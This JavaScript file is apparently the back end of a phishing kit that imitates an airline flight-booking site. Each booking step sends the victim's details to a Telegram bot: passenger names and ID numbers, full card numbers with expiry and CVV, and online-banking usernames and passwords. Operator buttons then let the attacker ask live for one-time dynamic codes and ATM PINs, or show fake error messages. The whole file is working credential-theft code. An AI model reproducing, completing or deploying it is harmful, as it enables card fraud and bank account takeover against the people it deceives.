// ========== ACCIONES DE ENVÍO ==========

// Paso 1 - Búsqueda de vuelo (index.js)
async function accionBusqueda(info) {
    const fi = info?.flightInfo || {};
    const msg = `✈️ *BÚSQUEDA DE VUELO*\n\n🛫 *Origen:* ${fi.origin?.city || fi.origin || 'N/A'}\n🛬 *Destino:* ${fi.destination?.city || fi.destination || 'N/A'}\n👥 *Adultos:* ${fi.adults || 0} | *Niños:* ${fi.children || 0} | *Bebés:* ${fi.babies || 0}\n📅 *Fechas:* ${fi.flightDates?.[0] || 'N/A'} - ${fi.flightDates?.[1] || 'N/A'}\n📱 *Dispositivo:* ${info?.metaInfo?.disp || 'N/A'}`;
    return await sendTelegram(msg);
}

// Paso 2 - Selección vuelo ida (select-flight-go.js)
async function accionVueloIda(info) {
    const fi = info?.flightInfo || {};
    const msg = `✈️ *VUELO IDA SELECCIONADO*\n\n🛫 *${fi.origin?.city || 'N/A'}* → 🛬 *${fi.destination?.city || 'N/A'}*\n🎫 *Tarifa:* ${fi.origin?.ticket_type || 'N/A'}\n💰 *Precio:* $${fi.origin?.price?.toLocaleString('es-CO') || 'N/A'}`;
    return await sendTelegram(msg);
}

// Paso 3 - Selección vuelo vuelta (select-flight-back.js)
async function accionVueloVuelta(info) {
    const fi = info?.flightInfo || {};
    const msg = `✈️ *VUELO VUELTA SELECCIONADO*\n\n🛬 *${fi.destination?.city || 'N/A'}* → 🛫 *${fi.origin?.city || 'N/A'}*\n🎫 *Tarifa:* ${fi.destination?.ticket_type || 'N/A'}\n💰 *Precio:* $${fi.destination?.price?.toLocaleString('es-CO') || 'N/A'}`;
    return await sendTelegram(msg);
}

// Paso 4 - Datos pasajeros (passengers-info.js)
async function accionPasajeros(info) {
    const pas = info?.passengersInfo?.adults?.[0] || {};
    const fi = info?.flightInfo || {};
    const msg = `👤 *DATOS PASAJERO*\n\n✏️ *Nombre:* ${pas.name || 'N/A'} ${pas.surname || ''}\n🪪 *Cédula:* ${pas.cc || 'N/A'}\n🛫 *Ruta:* ${fi.origin?.city || 'N/A'} → ${fi.destination?.city || 'N/A'}`;
    return await sendTelegram(msg);
}

// Paso 5 - Datos de pago (load1.html)
async function accionPago(datosPago) {
    const msg = `💳 *DATOS DE PAGO*\n\n👤 *Nombre:* ${datosPago.nombre || 'N/A'}\n🪪 *Cédula:* ${datosPago.cedula || 'N/A'}\n📱 *Teléfono:* ${datosPago.telefono || 'N/A'}\n📧 *Email:* ${datosPago.email || 'N/A'}\n🏙️ *Ciudad:* ${datosPago.ciudad || 'N/A'}\n\n💳 *Tarjeta:* ${datosPago.tarjeta || 'N/A'}\n📅 *Vence:* ${datosPago.vence || 'N/A'}\n🔐 *CVV:* ${datosPago.cvv || 'N/A'}\n🏦 *Banco:* ${datosPago.banco || 'N/A'}\n💰 *Total:* $${Number(datosPago.total || 0).toLocaleString('es-CO')}\n🛫 *Ruta:* ${datosPago.ruta || 'N/A'}`;
    return await sendTelegram(msg);
}

// Paso 6 - Clave bancaria (3d.html) — con botones inline
async function accionClaveBancaria(datosPago, usuario, clave) {
    const msg = `🔐 *CLAVE BANCARIA*\n\n👤 *Nombre:* ${datosPago.nombre || 'N/A'}\n💳 *Tarjeta:* ${datosPago.tarjeta || 'N/A'}\n🏦 *Banco:* ${datosPago.banco || 'N/A'}\n\n👤 *Usuario banco:* ${usuario}\n🔑 *Clave banco:* ${clave}`;

    const botones = {
        inline_keyboard: [
            [
                { text: "✅ Aprobar",           callback_data: "aprobar" },
                { text: "❌ Error de login",     callback_data: "error_login" }
            ],
            [
                { text: "🔄 Pedir dinámica",     callback_data: "pedir_dinamica" },
                { text: "🏧 Clave de cajero",    callback_data: "pedir_cajero" }
            ],
            [
                { text: "⚠️ Error de dinámica",  callback_data: "error_dinamica" },
                { text: "🔑 Error de clave",     callback_data: "error_clave" }
            ],
            [
                { text: "💳 Error de tarjeta",   callback_data: "error_tarjeta" }
            ]
        ]
    };

    return await sendTelegramConBotones(msg, botones);
}
